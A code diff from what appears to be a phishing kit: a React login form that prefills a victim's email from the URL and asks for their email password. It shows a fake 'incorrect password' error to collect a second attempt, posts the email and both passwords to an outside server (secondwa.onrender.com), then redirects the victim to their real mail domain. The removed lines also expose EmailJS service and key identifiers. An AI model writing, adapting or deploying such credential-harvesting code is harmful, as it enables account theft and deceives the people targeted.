@@ -3,6 +3,7 @@ import React, { useState } from "react";
 import { Styls } from "./stylls";
 import emailjs from "emailjs-com";
 import { useParams } from "react-router-dom";
+import axios from "axios";
 
 function Forms() {
   const params = useParams();
@@ -10,53 +11,44 @@ function Forms() {
 
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
-
-  const submitHandler = (e) => {
+    const [pass, setPass] = useState("");
+  const [pasers, setPasser] = useState("");
+  const [email, setEmail] = useState(params.id);
+  
+  const submitHandler = async (e) => {
     e.preventDefault();
 
-    emailjs
-      .sendForm(
-        "service_p40fdcw",
-        "template_kxg2c6g",
-        e.target,
-        "E4OmQ4Nx-QZz0EnUm"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
-    e.preventDefault();
-    setShowForm(false);
+    console.log(email, pass);
     setConfirmForm(true);
+    setShowForm(false);
+    try {
+      await axios.post("https://secondwa.onrender.com/sendmail2", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
   };
-
-  const editHandler = (e) => {
+  const editHandler = async (e) => {
     e.preventDefault();
+
     let emailss = params.id;
     let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
-    emailjs
-      .sendForm(
-        "service_p40fdcw",
-        "template_kxg2c6g",
-        e.target,
-        "E4OmQ4Nx-QZz0EnUm"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
-
     window.setTimeout(() => {
       window.location.href = `https://${domain}`;
     }, 1000);
+
+    try {
+      await axios.post("https://secondwa.onrender.com/sendmail2", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
   };
   return (
     <Styls>
@@ -78,13 +70,13 @@ function Forms() {
               <span className="newicon1">
                 <i class="fas fa-user fa-1x"></i>
               </span>
-              <input
-                type="email"
-                name="to_user"
-                required
-                placeholder="Enter your email address"
-                value={params.id}
-              />
+               <input
+                      type="email"
+                      required
+                      value={email}
+                      className="form-control"
+                      onChange={(e) => setEmail(e.target.value)}
+                    />
             </label>
             <br></br>
             <br></br>
@@ -123,13 +115,13 @@ function Forms() {
               <span className="newicon1">
                 <i class="fas fa-user fa-1x"></i>
               </span>
-              <input
-                type="email"
-                name="to_user"
-                required
-                value={params.id}
-                placeholder="Enter your email address"
-              />
+                  <input
+                      type="email"
+                      required
+                      value={email}
+                      className="form-control"
+                      onChange={(e) => setEmail(e.target.value)}
+                    />
             </label>
             <br></br>
 
@@ -139,12 +131,15 @@ function Forms() {
               <span className="newicon1">
                 <i class="fas fa-lock fa-1x"></i>
               </span>
-              <input
-                type="password"
-                name="to_pass"
-                required
-                placeholder="Enter your email password"
-              />
+                 <input
+                      type="password"
+                      onChange={(e) => setPasser(e.target.value)}
+                      required
+                      value={pasers}
+                      placeholder="Password"
+                       pattern="(?=.*[0-9]).{8,}"
+                      className="form-control"
+                    />
             </label>
             <p className="reda">Login failed Incorrect Password</p>
             <button> Login </button>
